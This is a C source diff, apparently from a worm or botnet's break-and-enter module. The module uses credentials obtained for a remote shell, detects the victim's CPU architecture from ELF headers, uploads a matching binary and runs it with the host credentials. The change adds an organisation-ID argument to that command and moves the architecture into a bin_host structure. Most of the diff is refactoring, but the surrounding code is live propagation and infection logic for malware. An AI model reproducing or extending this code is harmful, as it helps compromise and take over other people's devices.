@@ -99,6 +99,7 @@ typedef struct {
 	*/
 	const char *nl;
 	char *host_cred;
+	char *org_id;
 	uint8_t buf[2048];
 	char *upload_dir;
 	pth_event_t ev;
@@ -183,6 +184,7 @@ static void bne_init_sh_ctx (bne_sh_ctx_t *p, prne_rnd_t *rnd) {
 
 static void bne_free_sh_ctx (bne_sh_ctx_t *p) {
 	prne_free(p->host_cred);
+	prne_free(p->org_id);
 	bne_sh_ctx_free_mp(p);
 	prne_free_llist(&p->up_loc);
 	prne_free_llist(&p->up_methods);
@@ -1191,6 +1193,7 @@ static bool bne_sh_setup (
 	mp_arr = NULL;
 	mp_cnt = 0;
 
+	ctx->result.bin_host.os = PRNE_OS_LINUX;
 	{
 		// determine arch
 		bne_sh_elf_parse_ctx_t ep;
@@ -1236,30 +1239,50 @@ static bool bne_sh_setup (
 			}
 
 			if (cpc.v7 && cpc.vfp && cpc.thumb) {
-				ctx->result.arch = PRNE_ARCH_ARMV7;
+				ctx->result.bin_host.arch = PRNE_ARCH_ARMV7;
 			}
 			else {
-				ctx->result.arch = PRNE_ARCH_ARMV4T;
+				ctx->result.bin_host.arch = PRNE_ARCH_ARMV4T;
 			}
 		}
 		else {
 			switch (ep.e_data) {
 			case ELFDATA2LSB:
 				switch (ep.e_machine) {
-				case EM_386: ctx->result.arch = PRNE_ARCH_I686; break;
-				case EM_X86_64: ctx->result.arch = PRNE_ARCH_X86_64; break;
-				case EM_AARCH64: ctx->result.arch = PRNE_ARCH_AARCH64; break;
-				case EM_MIPS: ctx->result.arch = PRNE_ARCH_MPSL; break;
-				case EM_SH: ctx->result.arch = PRNE_ARCH_SH4; break;
-				case EM_ARC: ctx->result.arch = PRNE_ARCH_ARC; break;
+				case EM_386:
+					ctx->result.bin_host.arch = PRNE_ARCH_I686;
+					break;
+				case EM_X86_64:
+					ctx->result.bin_host.arch = PRNE_ARCH_X86_64;
+					break;
+				case EM_AARCH64:
+					ctx->result.bin_host.arch = PRNE_ARCH_AARCH64;
+					break;
+				case EM_MIPS:
+					ctx->result.bin_host.arch = PRNE_ARCH_MPSL;
+					break;
+				case EM_SH:
+					ctx->result.bin_host.arch = PRNE_ARCH_SH4;
+					break;
+				case EM_ARC:
+					ctx->result.bin_host.arch = PRNE_ARCH_ARC;
+					break;
 				}
 				break;
 			case ELFDATA2MSB:
 				switch (ep.e_machine) {
-				case EM_MIPS: ctx->result.arch = PRNE_ARCH_MIPS; break;
-				case EM_PPC: ctx->result.arch = PRNE_ARCH_PPC; break;
-				case EM_68K: ctx->result.arch = PRNE_ARCH_M68K; break;
-				case EM_ARC: ctx->result.arch = PRNE_ARCH_ARCEB; break;
+				case EM_MIPS:
+					ctx->result.bin_host.arch = PRNE_ARCH_MIPS;
+					break;
+				case EM_PPC:
+					ctx->result.bin_host.arch = PRNE_ARCH_PPC;
+					break;
+				case EM_68K:
+					ctx->result.bin_host.arch = PRNE_ARCH_M68K;
+					break;
+				case EM_ARC:
+					ctx->result.bin_host.arch = PRNE_ARCH_ARCEB;
+					break;
 				}
 				break;
 			}
@@ -1267,7 +1290,7 @@ static bool bne_sh_setup (
 	}
 
 	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
-		const char *arch_str = prne_arch_tostr(ctx->result.arch);
+		const char *arch_str = prne_arch_tostr(ctx->result.bin_host.arch);
 
 		if (arch_str == NULL) {
 			prne_dbgpf(
@@ -1281,7 +1304,7 @@ static bool bne_sh_setup (
 				arch_str);
 		}
 	}
-	ret = ctx->result.arch != PRNE_ARCH_NONE;
+	ret = ctx->result.bin_host.arch != PRNE_ARCH_NONE;
 
 END: // CATCH
 	if (!ret && ctx->result.err == 0) {
@@ -1299,27 +1322,28 @@ END: // CATCH
 }
 
 static bool bne_sh_start_rcb (prne_bne_t *ctx, bne_sh_ctx_t *sh_ctx) {
-	prne_arch_t actual;
-
 	ctx->result.prc = prne_start_bin_rcb_compat(
 		&sh_ctx->rcb,
-		ctx->result.arch,
-		ctx->param.rcb->self,
+		ctx->result.bin_host,
+		NULL,
 		ctx->param.rcb->m_self,
 		ctx->param.rcb->self_len,
 		ctx->param.rcb->exec_len,
 		ctx->param.rcb->m_dv,
 		ctx->param.rcb->dv_len,
 		ctx->param.rcb->ba,
-		&actual);
+		&ctx->result.bin_used);
 
 	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
 		if (ctx->result.prc == PRNE_PACK_RC_OK) {
-			if (actual != ctx->result.arch) {
+			if (!prne_eq_bin_host(
+					&ctx->result.bin_used,
+					&ctx->result.bin_host))
+			{
 				prne_dbgpf(
 					"bne sh@%"PRIxPTR"\t: using compat arch %s\n",
 					(uintptr_t)ctx,
-					prne_arch_tostr(ctx->result.arch));
+					prne_arch_tostr(ctx->result.bin_used.arch));
 			}
 		}
 		else {
@@ -1620,7 +1644,10 @@ static bool bne_sh_run_exec (
 	const char *exec)
 {
 	const char *sb_cmd[] = {
-		"\"./", exec, "\" \"", s_ctx->host_cred, "\";echo $?;"
+		"\"./", exec, "\" ",
+		"\"", s_ctx->host_cred, "\" ",
+		"\"", s_ctx->org_id, "\"",
+		";echo $?;"
 	};
 	char *cmd;
 	bne_sh_parser_t parser;
@@ -1702,6 +1729,23 @@ END:
 	prne_free(m);
 }
 
+static void bne_build_org_id (bne_sh_ctx_t *s_ctx, const uint8_t *id) {
+	size_t olen;
+
+	prne_free(s_ctx->org_id);
+	s_ctx->org_id = NULL;
+	if (id == NULL) {
+		return;
+	}
+
+	mbedtls_base64_encode(NULL, 0, &olen, id, 16);
+	s_ctx->org_id = prne_malloc(1, olen);
+	if (s_ctx->org_id == NULL) {
+		return;
+	}
+	mbedtls_base64_encode((unsigned char*)s_ctx->org_id, olen, &olen, id, 16);
+}
+
 static bool bne_do_shell (prne_bne_t *ctx, bne_sh_ctx_t *sh_ctx) {
 	bool alloc;
 	bool ret = false;
@@ -1710,6 +1754,7 @@ static bool bne_do_shell (prne_bne_t *ctx, bne_sh_ctx_t *sh_ctx) {
 
 // TRY
 	bne_build_host_cred(sh_ctx, ctx->result.cred.id, ctx->result.cred.pw);
+	bne_build_org_id(sh_ctx, ctx->param.org_id);
 
 	exec_name = ctx->param.cb.exec_name(ctx->param.cb_ctx);
 	if (exec_name == NULL) {
@@ -2144,7 +2189,7 @@ static bool bne_vhtbt_do_upbin_us (
 
 	mh.id = prne_htbt_gen_msgid(&ctx->rnd, bne_vhtbt_msgid_f);
 	mh.op = PRNE_HTBT_OP_RCB;
-	rcb_f.arch = prne_host_arch;
+	rcb_f.arch = PRNE_HOST_ARCH;
 	rcb_f.compat = true;
 	prne_pth_reset_timer(ev, &BNE_SCK_OP_TIMEOUT);
 	if (!bne_vhtbt_do_ayt(ctx, vctx, ev)) {
@@ -3767,8 +3812,6 @@ prne_bne_t *prne_alloc_bne (
 
 	ret->result.subject = &ret->param.subject;
 	ret->result.vec = PRNE_BNE_V_NONE;
-	ret->result.prc = PRNE_PACK_RC_OK;
-	ret->result.arch = PRNE_ARCH_NONE;
 
 	w->ctx = ret;
 	w->entry = bne_entry_f;
